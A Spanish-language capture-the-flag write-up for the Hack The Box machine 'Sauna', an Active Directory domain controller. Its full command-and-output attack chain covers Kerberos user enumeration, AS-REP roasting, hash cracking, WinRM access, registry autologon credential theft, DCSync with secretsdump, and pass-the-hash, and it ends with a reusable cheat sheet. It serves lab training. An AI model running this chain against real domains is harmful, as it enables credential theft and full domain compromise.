
# Sauna (HTB) — Writeup

**Máquina:** Sauna
**IP:** 10.129.64.189
**Dificultad:** Fácil
**SO:** Windows Server (Domain Controller)
**Dominio:** `EGOTISTICAL-BANK.LOCAL`
**Fecha de resolución:** 30/09/2026

---

## Resumen ejecutivo

Sauna es una máquina Windows Server configurada como Domain Controller de Active Directory. La ruta de compromiso comienza con la enumeración de la web corporativa, donde se filtran nombres de empleados. A partir de ellos se generan posibles nombres de usuario y se enumeran cuentas válidas vía Kerberos. La cuenta `fsmith` tiene la pre-autenticación Kerberos deshabilitada, lo que permite un ataque **AS-REP Roasting** para obtener un hash crackeable. Tras el acceso inicial por WinRM, se encuentran credenciales de un usuario de servicio en el registro (autologon mal configurado). Ese usuario de servicio tiene permisos **DCSync** sobre el dominio, lo que permite volcar los hashes de todos los usuarios —incluido el Administrator— y obtener acceso total mediante **Pass-the-Hash**.

---

## 1. Reconocimiento

### Escaneo de puertos

```bash
nmap -sC -sV -p- 10.129.64.189
```

**Puertos relevantes:**

| Puerto | Servicio | Notas |
|--------|----------|-------|
| 53 | DNS | |
| 80 | HTTP | IIS — web corporativa |
| 88 | Kerberos | **Indica Domain Controller** |
| 389/636 | LDAP/LDAPS | Active Directory |
| 445 | SMB | |
| 5985 | WinRM | Acceso remoto potencial |

**Análisis:** la presencia de Kerberos (88), LDAP (389) y SMB (445) confirma un entorno Active Directory. El puerto 88 indica que la máquina es un Domain Controller.

---

## 2. Enumeración web (OSINT)

La web corporativa en `http://10.129.64.189` incluye una sección "Meet the Team" en `about.html` con los siguientes nombres:

- Fergus Smith
- Hugo Bear
- Steven Kerb
- Shaun Coins
- Bowie Taylor
- Sophie Driver

**Conclusión:** candidatos a nombres de usuario para enumeración Kerberos.

---

## 3. Generación de nombres de usuario

Se utiliza **`username-anarchy`** (UrbanAdventurer) para convertir los nombres reales en permutaciones de posibles nombres de usuario.

```bash
git clone https://github.com/urbanadventurer/username-anarchy.git
cd username-anarchy
```

**Guardar nombres:**

```bash
cat > names.txt << 'EOF'
Fergus Smith
Hugo Bear
Steven Kerb
Shaun Coins
Bowie Taylor
Sophie Driver
EOF
```

**Generar permutaciones (todos los formatos):**

```bash
./username-anarchy -i names.txt > usernames.txt
```

**O filtrar solo los formatos más comunes en AD:**

```bash
./username-anarchy -i names.txt -f flast,first.last,firstlast > usernames.txt
```

Formatos que genera la herramienta:

| Formato | Ejemplo ("Fergus Smith") |
|---------|--------------------------|
| first | `fergus` |
| last | `smith` |
| firstlast | `fergussmith` |
| first.last | `fergus.smith` |
| **flast** | **`fsmith`** ✅ |
| f.last | `f.smith` |
| lastfirst | `smithfergus` |
| firstl | `ferguss` |

**Formato válido en este dominio:** `flast` → `fsmith`.

---

## 4. Enumeración de usuarios (Kerberos)

```bash
kerbrute userenum --dc 10.129.64.189 -d EGOTISTICAL-BANK.LOCAL usernames.txt
```

**Resultado:**

```
[+] VALID USERNAME: fsmith@EGOTISTICAL-BANK.LOCAL
Tested 88 usernames (1 valid)
```

**Usuario válido:** `fsmith`

```bash
cat > user_valid.txt << 'EOF'
fsmith
EOF
```

---

## 5. AS-REP Roasting

Con un usuario válido y sin credenciales, se prueba AS-REP Roasting. Esta técnica funciona cuando la cuenta tiene la pre-autenticación Kerberos deshabilitada (`UF_DONT_REQUIRE_PREAUTH`), permitiendo solicitar un AS-REP sin autenticarse.

```bash
GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -usersfile user_valid.txt -no-pass -dc-ip 10.129.64.189 -format hashcat
```

**Resultado:** hash AS-REP de `fsmith`:

```
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:2341bbc8...215ebb
```

**Verificación del tipo de hash:**

```bash
cat fsmith.hash | tr -d '\n' | haiti -
# Kerberos 5 AS-REP etype 23 [HC: 18200] [JtR: krb5asrep]
```

---

## 6. Cracking del hash

En una VM sin GPU dedicada, hashcat necesita el backend OpenCL de CPU:

```bash
sudo apt update
sudo apt install -y pocl-opencl-icd
hashcat -I
```

**Cracking:**

```bash
hashcat -m 18200 fsmith.hash /usr/share/wordlists/rockyou.txt
```

**Resultado:**

```
$krb5asrep$23$fsmith@...:Thestrokes23
Status: Cracked
```

**Credenciales obtenidas:**
- Usuario: `fsmith`
- Contraseña: `Thestrokes23`

---

## 7. Acceso inicial (WinRM)

```bash
evil-winrm -i 10.129.64.189 -u fsmith -p 'Thestrokes23'
```

**Flag de usuario:**

```powershell
type C:\Users\FSmith\Desktop\user.txt
# e65c88fe9b69302ccc62694f068531db
```

---

## 8. Enumeración local y escalada de privilegios

### 8.1 Credenciales en el registro (autologon)

Se consulta la clave de Winlogon, donde Windows almacena las credenciales de autologon en texto claro cuando está habilitado:

```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

**Resultado relevante:**

```
DefaultUserName    REG_SZ    EGOTISTICALBANK\svc_loanmanager
DefaultPassword    REG_SZ    Moneymakestheworldgoround!
```

**Nota crítica:** el registro indica `svc_loanmanager`, pero **esa cuenta no existe en AD**. La cuenta real es `svc_loanmgr` (sin "ana"). Esto se confirma porque:

- `bloodhound-python` con `svc_loanmanager` falla con `KDC_ERR_C_PRINCIPAL_UNKNOWN` (usuario no existe) y `52e` (credenciales inválidas).
- `evil-winrm` con `svc_loanmgr` funciona y `whoami` devuelve `egotisticalbank\svc_loanmgr`.

**Lección:** el `DefaultUserName` del registro puede no coincidir con el nombre real de la cuenta en AD. Verificar siempre con `whoami`.

### 8.2 Acceso como usuario de servicio

```bash
evil-winrm -i 10.129.64.189 -u svc_loanmgr -p 'Moneymakestheworldgoround!'
```

```powershell
whoami
# egotisticalbank\svc_loanmgr
```

### 8.3 Enumeración con BloodHound

Se instala BloodHound CE en Docker dentro de Kali y se recolectan datos con `bloodhound-python`:

```bash
bloodhound-python -u 'svc_loanmgr' -p 'Moneymakestheworldgoround!' -d EGOTISTICAL-BANK.LOCAL -ns 10.129.64.189 -c All
```

**Hallazgo en BloodHound:**

```
Source Node: SVC_LOANMGR@EGOTISTICAL-BANK.LOCAL
Target Node: EGOTISTICAL-BANK.LOCAL
Is ACL: TRUE
Is Inherited: FALSE
```

**Interpretación:** `svc_loanmgr` tiene permisos `GetChanges` + `GetChangesAll` sobre el dominio → **DCSync**.

---

## 9. DCSync — volcado de hashes del dominio

```bash
impacket-secretsdump 'EGOTISTICAL-BANK.LOCAL/svc_loanmgr:Moneymakestheworldgoround!@10.129.64.189'
```

**Resultado (extracto):**

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
EGOTISTICAL-BANK.LOCAL\HSmith:1103:...:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\FSmith:1105:...:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:...:9cb31797c39a9b170b04058ba2bba48c:::
SAUNA$:1000:...:555a310f279c4e4b62b04a0226feae50:::
```

**Hash NTLM del Administrator:** `823452073d75b9d1cf70ebdf86c7f98e`

> Nota: el warning inicial `RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied` es normal — `secretsdump` intenta primero el método de registro remoto y cae a DRSUAPI (DCSync), que es el que funciona.

---

## 10. Pass-the-Hash y flag de root

Con el hash NTLM del Administrator, no se necesita la contraseña en texto claro:

```bash
evil-winrm -i 10.129.64.189 -u Administrator -H '823452073d75b9d1cf70ebdf86c7f98e'
```

**Flag de root:**

```powershell
type C:\Users\Administrator\Desktop\root.txt
# 88cf824db220c485af8b960935886c32
```

---

## 11. Resumen del ataque

| Fase | Técnica | Resultado |
|------|---------|-----------|
| Reconocimiento | nmap | DC identificado (88, 389, 445) |
| Enum usuarios | OSINT web + `username-anarchy` + `kerbrute` | `fsmith` válido |
| AS-REP Roasting | `GetNPUsers.py` | Hash de `fsmith` |
| Cracking | `hashcat -m 18200` | `Thestrokes23` |
| Acceso inicial | `evil-winrm` | user.txt |
| Privesc (1) | Registro Winlogon | creds de `svc_loanmgr` |
| Privesc (2) | BloodHound | `svc_loanmgr` tiene DCSync |
| Privesc (3) | `secretsdump` (DCSync) | hash NTLM de Administrator |
| Root | Pass-the-Hash | root.txt |

---

## 12. Flags

| Flag | Valor |
|------|-------|
| user.txt | `e65c88fe9b69302ccc62694f068531db` |
| root.txt | `88cf824db220c485af8b960935886c32` |

---

## 13. Lecciones y conceptos clave

- **Puerto 88 abierto = Domain Controller.** Pensar en Kerberos.
- **Kerberos filtra la existencia de usuarios** → `kerbrute userenum` sin credenciales.
- **`username-anarchy`** convierte nombres reales en permutaciones de usernames. En AD, probar primero formatos comunes (`flast`, `first.last`, `firstlast`).
- **AS-REP Roasting** funciona si el usuario tiene `UF_DONT_REQUIRE_PREAUTH` deshabilitada. No requiere credenciales.
- **Kerberoasting** requiere credenciales válidas + SPN. Distinguir cuándo usar cada uno.
- **El registro Winlogon** es un sitio clásico para credenciales de autologon en texto claro.
- **El `DefaultUserName` del registro puede no coincidir con el nombre real de la cuenta en AD.** Verificar con `whoami`.
- **BloodHound** es imprescindible en AD para identificar rutas de escalada (DCSync, ACLs, sesiones).
- **DCSync** abusa de permisos legítimos de replicación (`GetChanges` + `GetChangesAll`). No es un exploit de software.
- **Pass-the-Hash** permite autenticarse con el hash NTLM sin conocer la contraseña.
- **El hash de `krbtgt`** permite forjar Golden Tickets y persistir en el dominio — concepto clave de post-explotación.
- **hashcat en VMs sin GPU:** instalar `pocl-opencl-icd` para habilitar el backend OpenCL de CPU.

---

## 14. Comandos de referencia rápida

```bash
# Generación de usernames
./username-anarchy -i names.txt > usernames.txt
./username-anarchy -i names.txt -f flast,first.last,firstlast > usernames.txt

# Enumeración de usuarios
kerbrute userenum --dc <IP> -d <DOMAIN> usernames.txt

# AS-REP Roasting
GetNPUsers.py <DOMAIN>/ -usersfile users.txt -no-pass -dc-ip <IP> -format hashcat

# Verificar tipo de hash
haiti '<hash>'

# Cracking AS-REP
hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt

# WinRM
evil-winrm -i <IP> -u <user> -p '<pass>'

# BloodHound
bloodhound-python -u <user> -p '<pass>' -d <DOMAIN> -ns <IP> -c All

# DCSync
impacket-secretsdump '<DOMAIN>/<user>:<pass>@<IP>'

# Pass-the-Hash
evil-winrm -i <IP> -u Administrator -H '<NTLM>'
```

---

## 15. Referencias

- [HackTricks — AS-REP Roasting](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast)
- [HackTricks — DCSync](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync)
- [BloodHound — Documentación oficial](https://bloodhound.readthedocs.io/)
- [Impacket — secretsdump.py](https://github.com/fortra/impacket)
- [username-anarchy — UrbanAdventurer](https://github.com/urbanadventurer/username-anarchy)
- [kerbrute — ropnop](https://github.com/ropnop/kerbrute)

---

**Fin del writeup.** Máquina resuelta completamente: acceso inicial, escalada de privilegios y compromiso total del dominio.